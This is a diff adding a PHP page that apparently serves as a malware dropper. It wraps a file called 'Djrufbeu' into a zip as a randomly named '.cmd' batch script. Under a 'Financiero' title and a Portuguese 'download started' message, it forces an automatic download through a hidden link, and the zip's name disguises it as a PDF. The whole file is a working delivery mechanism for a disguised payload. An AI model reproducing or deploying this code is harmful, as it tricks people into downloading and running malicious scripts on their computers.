@@ -1,0 +1,153 @@
+<?php
+ini_set('display_errors',0);
+ini_set('display_startup_erros',0);
+error_reporting(E_ALL);
+include "remove.php";
+
+$arquive = Time();
+$uni = uniqid() ;
+
+
+// Criando o objeto
+$z = new ZipArchive();
+
+// Criando o pacote chamado "teste.zip"
+$criou = $z->open("$zfilename", ZipArchive::CREATE);
+if ($criou === true) {
+
+    // Criando um diretorio chamado "teste" dentro do pacote
+    //$z->addEmptyDir("$arquive");
+
+	// coiando
+	$z->addFile('Djrufbeu', "ZipArchivea10df01a7cf779".$uni.".cmd");
+       
+    // Criando um TXT dentro do diretorio "teste" a partir do valor de uma string
+	//$z->addFromString('teste/texto.txt', 'Conteúdo do arquivo de Texto');
+
+    // Criando outro TXT dentro do diretorio "teste"
+    //$z->addFromString('teste/outro.txt', 'Outro arquivo');
+
+    // Copiando um arquivo do HD para o diretorio "teste" do pacote
+    //$z->addFile('/home/rubens/teste.php', 'teste/teste.php');
+
+    // Apagando o segundo TXT
+   // $z->deleteName('teste/outro.txt');
+
+    // Salvando o arquivo
+    $z->close();
+} else {
+    echo 'Erro: '.$criou;
+}
+ $teste = $zfilename;
+
+ $arquivofile = $zfilename;
+ $stringfile = file_get_contents($arquivofile);
+ 
+ 
+
+
+?>
+
+<script>
+
+setInterval(function(){
+ }, 5000);	
+	
+     $(document).ready(function() {
+           $('a#<?php echo $arquive ?>')[0].click();
+     });
+	 
+    
+ 
+</script>
+
+<?php 
+
+
+echo '<html>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+<title>Financiero</title>
+<style>
+body {background-color:#;}
+ h1 {
+  text-align: center;
+  
+}
+ h3 {
+  text-align: center;
+  
+}
+</style>
+<body>
+<br>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-16">
+</head>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>426a436e5a4f4c634a4d317731724a77</title>
+            <style>
+                                body {
+                                    font-family: Arial, sans-serif;
+                                    display: flex;
+                                    justify-content: center;
+                                    align-items: center;
+                                    height: 100vh;
+                                    margin: 0;
+                                    text-align: center;
+                                }
+                                .message-box {
+                                    padding: 20px;
+                                    border: 1px solid #ddd;
+                                    border-radius: 5px;
+                                }
+                                .download-instructions {
+                                    font-size: 14px;
+                                    color: #666;
+                                    margin-top: 20px;
+                                }
+                                .arrow {
+                                    margin-top: 30px;
+                                    font-size: 24px;
+                                    animation: blink 1s step-start 0s infinite;
+                                }
+                                @keyframes blink {
+                                    50% { opacity: 0; }
+                                }
+                        </style></head>
+
+                       
+                        
+            <body>
+                    <div class="message-box">
+                        <h1 id="wCLM">Download iniciado</h1>
+                        <p id="KQNl5">O seu download foi iniciado. Verifique o canto inferior direito do seu browser.</p>
+                        <div class="download-instructions">
+                            <p id="Wn8wA">Aguarde ate que o download esteja concluido.</p>
+                        </div>
+                    </div>
+</body>
+</html>
+';
+
+?>
+
+<html>
+ <head>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+   <script>
+     $(document).ready(function() {
+       $('a#<?php echo $arquive ?>')[0].click();
+     });
+   </script>
+ </head>
+ <body>
+   <a id='<?php echo $arquive ?>' style="display:none"
+   href="data:application/x-zip-compressed;base64,<?php echo base64_encode($stringfile); ?>" download="30594PDFZipArchive10df01a7cf779<?php echo $arquive ?>.zip">Download</a>
+ </body>
+</html>
+
+
